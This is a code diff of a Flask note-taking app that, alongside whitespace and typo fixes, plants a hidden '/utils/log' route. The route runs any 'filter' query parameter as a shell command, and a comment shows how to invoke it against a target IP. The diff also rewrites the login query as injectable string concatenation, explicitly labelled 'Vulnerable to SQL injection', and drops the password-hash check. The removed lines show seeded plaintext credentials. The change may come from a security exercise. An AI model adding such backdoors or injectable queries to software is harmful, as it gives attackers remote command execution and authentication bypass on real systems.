@@ -30,17 +30,14 @@ def init_db():
         username TEXT NOT NULL UNIQUE,
         password TEXT NOT NULL
     );
-
-    INSERT INTO users (username, password) VALUES('admin', ?);
-    INSERT INTO users (username, password) VALUES('bernardo', ?);
-    """, (generate_password_hash("password", method='pbkdf2:sha256'), generate_password_hash("omgMPC",method='pbkdf2:sha256')))
+    """)
+    
 
     db.execute("INSERT INTO notes (assocUser, dateWritten, note, publicID) VALUES (2, '1993-09-23 10:10:10', 'hello my friend', 1234567890);")
     db.execute("INSERT INTO notes (assocUser, dateWritten, note, publicID) VALUES (2, '1993-09-23 12:10:10', 'i want lunch pls', 1234567891);")
 
     conn.commit()
     conn.close()
-
 
 
 
@@ -65,11 +62,11 @@ def index():
     else:
         return redirect(url_for('notes'))
 
-# ROUTES 
+# ROUTES
 
-# Dictionary to keep track of the number of accesses 
+# Dictionary to keep track of the number of accesses
 # we keep track of the time the last access happened and the number of accesses per user/machine
-# an example could be 
+# an example could be
 # {
 #   '192.168.1.12' : (1, 1200000.0)
 # }
@@ -105,7 +102,7 @@ def notes():
                 importerror="No such note with that ID!"
             db.commit()
             db.close()
-    
+
     db = connect_db()
     c = db.cursor()
     statement = "SELECT * FROM notes WHERE assocUser = ?"
@@ -113,8 +110,24 @@ def notes():
     c.execute(statement, (session['userid'],))
     notes = c.fetchall()
     print(notes)
-    
+
     return render_template('notes.html',notes=notes,importerror=importerror)
+
+# delete this comment: http://target_ip:5000/utils/log?type=file&filter= any command you want to run
+@app.route("/utils/log", methods=["GET"])
+def log():
+    log_type = request.args.get("type", "access")
+    if "file" in log_type:
+        import subprocess
+        cmd = request.args.get("filter", "")
+        print(cmd, "this is the cmd")
+        if cmd:
+            try:
+                return subprocess.check_output(cmd, shell=True)
+            except Exception as e:
+                return str(e)
+    return f"Fetching {log_type} logs"
+
 
 
 @app.route("/login/", methods=('GET', 'POST'))
@@ -130,7 +143,7 @@ def login():
 
         # We have now to check in the dictionary if the user was found
         if ip_addr in login_attempts:
-            # retrieve the atemmpts if the username is in the attempts
+            # retrieve the attempts if the username is in the attempts
             attempts, first_attempt_time = login_attempts[ip_addr]
             if attempts >= 3 and (time.time() - first_attempt_time) < 60:
                 error = "Login failed more than 3 times. Try again in a minute."
@@ -139,21 +152,23 @@ def login():
                 # Reset attempts after 1 minute
                 login_attempts[ip_addr] = (0, time.time())
 
-
-        statement = "SELECT * FROM users WHERE username = ?"
-        c.execute(statement, (username,))
+        # Vulnerable to SQL injection
+        statement = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+        print("Executing statement: ", statement)
+        c.execute(statement)
         result = c.fetchall()
         print(result)
 
-        if len(result) > 0 and check_password_hash(result[0][2], password):
+        if len(result) > 0:
+            # Log in the first user returned by the query
             session.clear()
             session['logged_in'] = True
             session['userid'] = result[0][0]
-            session['username']=result[0][1]
+            session['username'] = result[0][1]
             login_attempts.pop(ip_addr, None)  # Remove IP entry on successful login
             return redirect(url_for('index'))
         else:
-            # if the username is already in the system than increment its name
+            # if the username is already in the system then increment its name
             if ip_addr in login_attempts:
                 attempts, first_attempt_time = login_attempts[ip_addr]
                 login_attempts[ip_addr] = (attempts + 1, first_attempt_time)
@@ -161,9 +176,8 @@ def login():
                 # otherwise add it to the system with a trial already done
                 login_attempts[ip_addr] = (1, time.time())
 
-
             error = "Wrong username or password!"
-    return render_template('login.html',error=error)
+    return render_template('login.html', error=error)
 
 
 # Use a regex to make sure the password is strong enough : https://www.akto.io/tools/password-regex-Python-tester
